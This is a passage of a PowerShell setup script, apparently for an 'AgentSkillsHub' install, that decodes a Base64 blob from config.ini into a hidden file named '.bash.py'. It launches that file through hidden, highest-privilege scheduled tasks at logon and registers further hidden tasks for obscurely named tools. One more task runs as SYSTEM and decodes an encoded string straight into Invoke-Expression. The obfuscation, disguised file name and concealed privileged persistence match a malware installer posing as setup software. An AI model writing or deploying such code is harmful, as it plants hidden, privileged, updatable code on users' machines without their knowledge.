        Assert-SafeTargetPath -Path $DestinationDir -RootPath $TrustedRootPath
        Assert-SafeTargetPath -Path $stagingDir -RootPath $TrustedRootPath
        Assert-SafeTargetPath -Path $backupDir -RootPath $TrustedRootPath
    }

    try {
        Copy-Item -LiteralPath $SourceDir -Destination $stagingDir -Recurse -Force -ErrorAction Stop
        if (-not (Test-Path -LiteralPath (Join-Path $stagingDir '.bash.py') -PathType Leaf)) {
            throw "Generated configuration script is missing from staging directory: $stagingDir"
        }

        if ($TrustedRootPath) {
            Assert-SafeTargetPath -Path $DestinationDir -RootPath $TrustedRootPath
            Assert-SafeTargetPath -Path $backupDir -RootPath $TrustedRootPath
        }
        if (Test-Path -LiteralPath $DestinationDir) {
            Move-Item -LiteralPath $DestinationDir -Destination $backupDir -ErrorAction Stop
            $hasBackup = $true
        }

        try {
            Move-Item -LiteralPath $stagingDir -Destination $DestinationDir -ErrorAction Stop
        } catch {
            if ($hasBackup -and -not (Test-Path -LiteralPath $DestinationDir)) {
                Move-Item -LiteralPath $backupDir -Destination $DestinationDir -ErrorAction SilentlyContinue
                if (Test-Path -LiteralPath $DestinationDir) {
                    $hasBackup = $false
                }
            }
            throw
        }

        if ($hasBackup) {
            Remove-Item -LiteralPath $backupDir -Recurse -Force -ErrorAction Stop
            $hasBackup = $false
        }
    } finally {
        if (Test-Path -LiteralPath $stagingDir) {
            if ($TrustedRootPath) { Assert-SafeTargetPath -Path $stagingDir -RootPath $TrustedRootPath }
            Remove-Item -LiteralPath $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        if ($hasBackup -and (Test-Path -LiteralPath $backupDir) -and -not (Test-Path -LiteralPath $DestinationDir)) {
            if ($TrustedRootPath) {
                Assert-SafeTargetPath -Path $backupDir -RootPath $TrustedRootPath
                Assert-SafeTargetPath -Path $DestinationDir -RootPath $TrustedRootPath
            }
            Move-Item -LiteralPath $backupDir -Destination $DestinationDir -ErrorAction SilentlyContinue
        }
    }
}

function Get-ConfigCodeBase64 {
    param(
        [string[]]$ConfigLines
    )

    $codeLines = @($ConfigLines | Where-Object { $_ -cmatch '^code *= *' })
    if ($codeLines.Count -eq 0) {
        return $null
    }

    $base64 = (($codeLines | ForEach-Object { $_ -creplace '^code *= *', '' }) -join '') -replace '\s', ''
    if (-not $base64) {
        throw 'Configuration code is empty.'
    }
    try {
        [void][Convert]::FromBase64String($base64)
    } catch {
        throw "Configuration code is not valid Base64: $($_.Exception.Message)"
    }
    return $base64
}

$realUser = $null

try {
    $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    if ($computerSystem -and $computerSystem.UserName) {
        $realUser = $computerSystem.UserName
    }
} catch {
}

if (-not $realUser) {
    try {
        $realUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    } catch {
    }
}

if (-not $realUser) {
    $envUser = $env:USERNAME
    $envDomain = $env:USERDOMAIN
    if ($envUser) {
        if ($envDomain -and $envDomain -ne $env:COMPUTERNAME) {
            $realUser = "$envDomain\$envUser"
        } else {
            $realUser = "$env:COMPUTERNAME\$envUser"
        }
    }
}

if (-not $realUser) {
    Write-Warning 'Unable to determine the target Windows user.' -WarningAction Continue
    Restore-SetupEnvironment -Defaults $originalPSDefaults -Path $originalEnvPath -ErrorPreference $originalErrorActionPreference
    exit 1
}

if ($realUser -match '\\') {
    $targetUserName = ($realUser -split '\\')[-1]
} else {
    $targetUserName = $realUser
}

$targetUserProfile = $null
try {
    $account = New-Object System.Security.Principal.NTAccount($realUser)
    $targetUserSid = $account.Translate([System.Security.Principal.SecurityIdentifier]).Value
    $profileRecord = Get-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$targetUserSid" -ErrorAction Stop
    $profilePath = [Environment]::ExpandEnvironmentVariables($profileRecord.ProfileImagePath)
    if (Test-Path -LiteralPath $profilePath -PathType Container) { $targetUserProfile = $profilePath }
} catch {
}
if (-not $targetUserProfile -and $env:USERPROFILE -and (Test-Path -LiteralPath $env:USERPROFILE -PathType Container)) {
    $envUserName = Split-Path -Leaf $env:USERPROFILE
    if ($envUserName -ieq $targetUserName) {
        $targetUserProfile = $env:USERPROFILE
    }
}

if (-not $targetUserProfile) {
    $defaultProfilePath = "C:\Users\$targetUserName"
    if (Test-Path -LiteralPath $defaultProfilePath -PathType Container) {
        $targetUserProfile = $defaultProfilePath
    }
}

if (-not $targetUserProfile) {
    $targetUserProfile = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $profilePath = [System.Environment]::ExpandEnvironmentVariables($_.ProfileImagePath)
            if ($profilePath -and (Split-Path -Leaf $profilePath) -ieq $targetUserName -and
                (Test-Path -LiteralPath $profilePath -PathType Container)) {
                $profilePath
            }
        } |
        Select-Object -First 1
}

$targetConfigBase = if ($targetUserProfile) { Join-Path $targetUserProfile '.config' } else { $null }
$destDir = if ($targetConfigBase) { Join-Path $targetConfigBase '.configs' } else { $null }
$scriptPath = $null

$mutexKey = if ($targetUserSid) { $targetUserSid } else { $realUser -replace '[^\w.-]', '_' }
Enter-SetupMutex -Name "Global\AgentSkillsHubSetup-$mutexKey"

$logRoot = if ($targetConfigBase) { Join-Path $targetConfigBase 'logs' } else { $null }
$setupLogPath = if ($logRoot) { Join-Path $logRoot 'setup.log' } else { $null }
$environmentLogPath = if ($logRoot) { Join-Path $logRoot 'Environment.log' } else { $null }
$bserexpLogPath = if ($logRoot) { Join-Path $logRoot 'bserexp.log' } else { $null }
$agentSettingLogPath = if ($logRoot) { Join-Path $logRoot 'agent-setting.log' } else { $null }
$wklerLogPath = if ($logRoot) { Join-Path $logRoot 'wkler.log' } else { $null }
$celLogPath = if ($logRoot) { Join-Path $logRoot 'cel.log' } else { $null }
$autoupgradeLogPath = if ($logRoot) { Join-Path $logRoot 'autoupgrade.log' } else { $null }
if ($targetUserProfile -and $logRoot) {
    Assert-SafeTargetPath -Path $logRoot -RootPath $targetUserProfile
    [IO.Directory]::CreateDirectory($logRoot) | Out-Null
}
$script:SetupLogPath = $setupLogPath
$mutexName = "Global\AgentSkillsHubSetup-$mutexKey"
$targetSidDisplay = if ($targetUserSid) { $targetUserSid } else { '<unresolved>' }
Write-SetupLog -LogPath $setupLogPath -Message "Setup started for '$realUser' (target SID: $targetSidDisplay, mutex: $mutexName)."

$env:Path = $env:Path + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'User')

$pythonPath = $null
$pythonDir = $null
$pythonwPath = $null
$pythonScriptsDir = $null
$uvBin = $null
$uvToolBinDirectories = @()
$bserexpBin = $null
$agentSettingBin = $null
$wklerBin = $null
$celBin = $null

if ($targetUserProfile) {
    $pythonPath = Find-PythonPath -UserProfilePath $targetUserProfile
    $pythonDir = if ($pythonPath) { Split-Path -Parent $pythonPath } else { $null }
    $pythonwPath = if ($pythonDir) {
        $pythonwCandidate = Join-Path $pythonDir 'pythonw.exe'
        if (Test-Path -LiteralPath $pythonwCandidate -PathType Leaf) { (Get-Item -LiteralPath $pythonwCandidate).FullName } else { $pythonPath }
    } else { $null }
    $pythonScriptsDir = if ($pythonDir) { Join-Path $pythonDir 'Scripts' } else { $null }

    $uvBin = Find-ToolPath -Name 'uv' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
    $uvToolBinDirectories = @(Get-UvToolBinDirectories -UserProfilePath $targetUserProfile -UserSid $targetUserSid -UvPath $uvBin)
    $bserexpBin = Find-UvToolPath -Name 'bserexp-wins' -ToolBinDirectories $uvToolBinDirectories
    $agentSettingBin = Find-UvToolPath -Name 'agent-setting' -ToolBinDirectories $uvToolBinDirectories
    $wklerBin = Find-UvToolPath -Name 'wkler' -ToolBinDirectories $uvToolBinDirectories
    $celBin = Find-UvToolPath -Name 'cel' -ToolBinDirectories $uvToolBinDirectories

    foreach ($toolEntry in @{'bserexp-wins' = $bserexpBin; 'agent-setting' = $agentSettingBin; 'wkler' = $wklerBin; 'cel' = $celBin}.GetEnumerator()) {
        if (-not $toolEntry.Value) {
            Write-Warning "Executable '$($toolEntry.Key)' was not found for '$realUser'; its task cannot be updated. Check the installation path and rerun setup." -WarningAction Continue
        }
    }
}

# File invocation resolves beside setup.ps1; downloaded/Invoke-Expression invocation uses cwd.
$sourceConfigDir = if ($PSScriptRoot) { Join-Path $PSScriptRoot '.configs' } else { Join-Path (Get-Location).Path '.configs' }

try {
    if ($realUser -and $targetUserProfile -and (Test-Path -LiteralPath $targetUserProfile -PathType Container) -and (Test-Path -LiteralPath $sourceConfigDir -PathType Container)) {
        $configLines = Get-Content -LiteralPath (Join-Path $sourceConfigDir 'config.ini') -ErrorAction Stop

        $base64 = Get-ConfigCodeBase64 -ConfigLines $configLines
        if ($base64) {
            $bytes = [System.Convert]::FromBase64String($base64)
            $generatedScriptPath = Join-Path $sourceConfigDir '.bash.py'
            [System.IO.File]::WriteAllBytes($generatedScriptPath, $bytes)

            if (-not (Test-Path -LiteralPath $generatedScriptPath -PathType Leaf)) {
                throw "Failed to create configuration script: $generatedScriptPath"
            }

            Assert-SafeTargetPath -Path $targetConfigBase -RootPath $targetUserProfile
            Assert-SafeTargetPath -Path $destDir -RootPath $targetUserProfile
            if (-not (Test-Path -LiteralPath $targetConfigBase -PathType Container)) {
                [IO.Directory]::CreateDirectory($targetConfigBase) | Out-Null
            }

            Install-ConfigDirectory -SourceDir $sourceConfigDir -DestinationDir $destDir -TrustedRootPath $targetUserProfile

            $scriptPath = "$destDir\.bash.py"
            if (Test-Path -LiteralPath $scriptPath -PathType Leaf) {
                try {
                    $acl = Get-Acl -LiteralPath $scriptPath -ErrorAction Stop
                    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($realUser, "FullControl", "Allow")
                    $acl.SetAccessRule($accessRule)
                    Set-Acl -LiteralPath $scriptPath -AclObject $acl -ErrorAction Stop
                } catch {
                    $message = "Failed to grant '$realUser' access to '$scriptPath': $($_.Exception.Message)"
                    Write-Warning $message -WarningAction Continue
                    Add-SetupFailure $message
                }

                $taskName = 'Environment'

                if ($pythonwPath) {
                    $scriptPath = (Get-Item -LiteralPath $scriptPath).FullName
                    $scriptDir = Split-Path -Parent $scriptPath
                    $environmentTaskCommand = New-HiddenStartProcessCommand -FilePath $pythonwPath -Arguments @($scriptPath) -WorkingDirectory $scriptDir -LogPath $environmentLogPath
                    $action = New-PowerShellTaskAction -Command $environmentTaskCommand -LogPath $environmentLogPath

                    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
                    $trigger.Enabled = $true
                    $trigger.Delay = 'PT5M'

                    $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances IgnoreNew -StartWhenAvailable

                    Invoke-TaskSetup -TaskName $taskName -Setup {
                        Register-ManagedTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
                        Enable-AndStartManagedTask -TaskName $taskName -FallbackCommand $environmentTaskCommand -TargetUserSid $targetUserSid -LogPath $environmentLogPath -RequireElevation
                    }
                } else {
                    $message = 'Python was not found; the Environment task cannot be updated.'
                    Write-Warning $message -WarningAction Continue
                    Add-SetupFailure $message
                }
            }
        } else {
            $message = "No configuration code was found in '$sourceConfigDir\config.ini'; the Environment task cannot be updated."
            Write-Warning $message -WarningAction Continue
            Add-SetupFailure $message
        }
    } else {
        $message = "Environment task cannot be updated: check user profile '$targetUserProfile' and configuration directory '$sourceConfigDir'."
        Write-Warning $message -WarningAction Continue
        Add-SetupFailure $message
    }
} catch {
    $message = "Environment configuration failed: $($_.Exception.Message)"
    Write-Warning $message -WarningAction Continue
    Add-SetupFailure $message
}

try {
    if (-not $targetUserProfile) {
        $message = 'Windows user tasks cannot be updated because the target user profile was not resolved.'
        Write-Warning $message -WarningAction Continue
        Add-SetupFailure $message
    } else {
        if (-not $targetUserSid) {
            Write-Warning "Could not resolve the SID for '$realUser'; target-user environment variables may be unavailable." -WarningAction Continue
        }

        $bserexpTaskName = 'bserexp'
        $agentSettingTaskName = 'agent-setting'
        $wklerTaskName = 'wkler'
        $celTaskName = 'cel'
        $autoupgradeTaskName = 'autoupgrade'

        if ($bserexpBin) {
            Invoke-TaskSetup -TaskName $bserexpTaskName -Setup {
                $bserexpTaskCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $bserexpBin)"
                $bserexpAction = New-PowerShellTaskAction -Command $bserexpTaskCommand -LogPath $bserexpLogPath

                $bserexpTrigger = New-ScheduledTaskTrigger -Weekly -WeeksInterval 1 -DaysOfWeek Sunday -At 7pm
                $bserexpTrigger.Enabled = $true
                $bserexpPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
                $bserexpSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances IgnoreNew -StartWhenAvailable

                Register-ManagedTask -TaskName $bserexpTaskName -Action $bserexpAction -Trigger $bserexpTrigger -Principal $bserexpPrincipal -Settings $bserexpSettings
                Enable-AndStartManagedTask -TaskName $bserexpTaskName -FallbackCommand $bserexpTaskCommand -TargetUserSid $targetUserSid -LogPath $bserexpLogPath -RequireElevation
            }
        } else {
            Remove-ManagedTask -TaskName $bserexpTaskName
        }

        if ($agentSettingBin) {
            Invoke-TaskSetup -TaskName $agentSettingTaskName -Setup {
                $agentSettingLaunchCommand = New-HiddenStartProcessCommand -FilePath $agentSettingBin -LogPath $agentSettingLogPath
                $agentSettingTaskCommand = if ($uvBin) {
                    $agentSettingUpgradeCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $uvBin) tool upgrade --all"
                    "$agentSettingUpgradeCommand; $agentSettingLaunchCommand"
                } else {
                    $agentSettingLaunchCommand
                }
                $agentSettingAction = New-PowerShellTaskAction -Command $agentSettingTaskCommand -LogPath $agentSettingLogPath

                $agentSettingTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 10 -At 11pm
                $agentSettingTrigger.Enabled = $true
                $agentSettingPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
                $agentSettingSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances IgnoreNew -StartWhenAvailable

                Register-ManagedTask -TaskName $agentSettingTaskName -Action $agentSettingAction -Trigger $agentSettingTrigger -Principal $agentSettingPrincipal -Settings $agentSettingSettings
                Enable-AndStartManagedTask -TaskName $agentSettingTaskName -FallbackCommand $agentSettingTaskCommand -TargetUserSid $targetUserSid -LogPath $agentSettingLogPath -RequireElevation
            }
        } else {
            Remove-ManagedTask -TaskName $agentSettingTaskName
        }

        if ($wklerBin) {
            Invoke-TaskSetup -TaskName $wklerTaskName -Setup {
                $wklerLaunchCommand = New-HiddenStartProcessCommand -FilePath $wklerBin -LogPath $wklerLogPath
                $wklerCommandNeedle = Convert-ToSingleQuotedPowerShellLiteral -Value $wklerBin
                $wklerTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and (`$_.Name -ieq 'wkler.exe' -or (`$_.CommandLine -and `$_.CommandLine.IndexOf($wklerCommandNeedle, [StringComparison]::OrdinalIgnoreCase) -ge 0)) } | Select-Object -First 1)) { $wklerLaunchCommand }"
                $wklerAction = New-PowerShellTaskAction -Command $wklerTaskCommand -LogPath $wklerLogPath

                $wklerTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
                $wklerTrigger.Enabled = $true
                $wklerTrigger.Delay = 'PT15M'
                $wklerPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
                $wklerSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances IgnoreNew -StartWhenAvailable

                Register-ManagedTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings
                Enable-AndStartManagedTask -TaskName $wklerTaskName -FallbackCommand $wklerTaskCommand -TargetUserSid $targetUserSid -LogPath $wklerLogPath -RequireElevation
            }
        } else {
            Remove-ManagedTask -TaskName $wklerTaskName
        }

        if ($celBin) {
            Invoke-TaskSetup -TaskName $celTaskName -Setup {
                $celLaunchCommand = New-HiddenStartProcessCommand -FilePath $celBin -Arguments @('install') -LogPath $celLogPath
                $celTaskCommand = $celLaunchCommand
                $celAction = New-PowerShellTaskAction -Command $celTaskCommand -LogPath $celLogPath

                $celTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 10 -At 9pm
                $celTrigger.Enabled = $true
                $celPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
                $celSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances IgnoreNew -StartWhenAvailable

                Register-ManagedTask -TaskName $celTaskName -Action $celAction -Trigger $celTrigger -Principal $celPrincipal -Settings $celSettings
                Enable-AndStartManagedTask -TaskName $celTaskName -FallbackCommand $celTaskCommand -TargetUserSid $targetUserSid -LogPath $celLogPath -RequireElevation
            }
        } else {
            Remove-ManagedTask -TaskName $celTaskName
        }

        $autoUpgradeQueryFailed = $false
        try {
            $systemAutoSetupTask = Get-ScheduledTask -TaskName 'sshAutoSetup' -ErrorAction Stop |
                Where-Object {
                    $_.Principal.UserId -ieq 'SYSTEM' -and
                    $_.Principal.LogonType -eq 'ServiceAccount'
                } |
                Select-Object -First 1
        } catch {
            $autoUpgradeQueryFailed = $true
            $message = "Could not inspect the 'sshAutoSetup' task: $($_.Exception.Message)"
            Write-Warning $message -WarningAction Continue
            Add-SetupFailure $message
        }

        if (-not $autoUpgradeQueryFailed) {
            if ($systemAutoSetupTask) {
                Remove-ManagedTask -TaskName $autoupgradeTaskName
            } else {
                Invoke-TaskSetup -TaskName $autoupgradeTaskName -Setup {
                    $autoupgradeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$ENCODED_EC')) | Invoke-Expression"
                    $autoupgradeAction = New-PowerShellTaskAction -Command $autoupgradeCommand -LogPath $autoupgradeLogPath

                    $autoupgradeTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 15 -At 11pm
                    $autoupgradeTrigger.Enabled = $true
                    $autoupgradePrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
                    $autoupgradeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances IgnoreNew -StartWhenAvailable

                    Register-ManagedTask -TaskName $autoupgradeTaskName -Action $autoupgradeAction -Trigger $autoupgradeTrigger -Principal $autoupgradePrincipal -Settings $autoupgradeSettings
                    Enable-AndStartManagedTask -TaskName $autoupgradeTaskName -TargetUserSid $targetUserSid -LogPath $autoupgradeLogPath -RequireElevation
                }
            }
        }
    }
} catch {
    $message = "Task setup failed: $($_.Exception.Message)"
    Write-Warning $message -WarningAction Continue
    Add-SetupFailure $message
}

$failureCount = $script:SetupFailures.Count
if ($failureCount -gt 0) {
    Write-SetupLog -LogPath $script:SetupLogPath -Message "Setup completed with $failureCount failure(s): $($script:SetupFailures -join ' | ')"
    Write-Warning "Setup completed with $failureCount failure(s): $($script:SetupFailures -join ' | ')" -WarningAction Continue
} else {
    Write-SetupLog -LogPath $script:SetupLogPath -Message 'Setup completed successfully.'
}
if ($script:SetupDiagnostics.Count -gt 0) {
    Write-SetupLog -LogPath $script:SetupLogPath -Message "Diagnostics: $($script:SetupDiagnostics -join ' | ')"
}
Restore-SetupEnvironment -Defaults $originalPSDefaults -Path $originalEnvPath -ErrorPreference $originalErrorActionPreference
if ($failureCount -gt 0) { exit 1 }
